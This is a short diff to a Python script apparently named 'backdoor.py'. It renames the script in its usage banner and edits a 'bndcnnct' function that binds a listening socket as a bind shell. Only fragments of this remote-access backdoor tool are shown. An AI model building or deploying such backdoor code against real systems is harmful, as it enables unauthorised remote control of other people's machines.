@@ -10,8 +10,8 @@ print("""
 ██║  ██║██╔═══╝ ██║   ██║╚════╝ ╚██╔╝   ███╔╝     ██║   
 ██████╔╝██║     ╚██████╔╝        ██║   ███████╗   ██║   
 ╚═════╝ ╚═╝      ╚═════╝         ╚═╝   ╚══════╝   ╚═╝   
-Usage ./akhyls.py --l <PORT>
-Usage ./akhyls.py --v <Ip> <PORT>
+Usage ./backdoor.py --l <PORT>
+Usage ./backdoor.py --v <Ip> <PORT>
                                                         """)
 
 
@@ -63,7 +63,6 @@ def bndcnnct(port):
         output = subprocess.Popen(['hostname -I'], shell=True, stdout=subprocess.PIPE)
         a=output.stdout.read()
         ip_candidates = re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b",str(a))[0]
-        print(ip_candidates)
         bindshell=socket.socket()
         bindshell.bind((ip_candidates,int(port)))
         bindshell.listen(2)
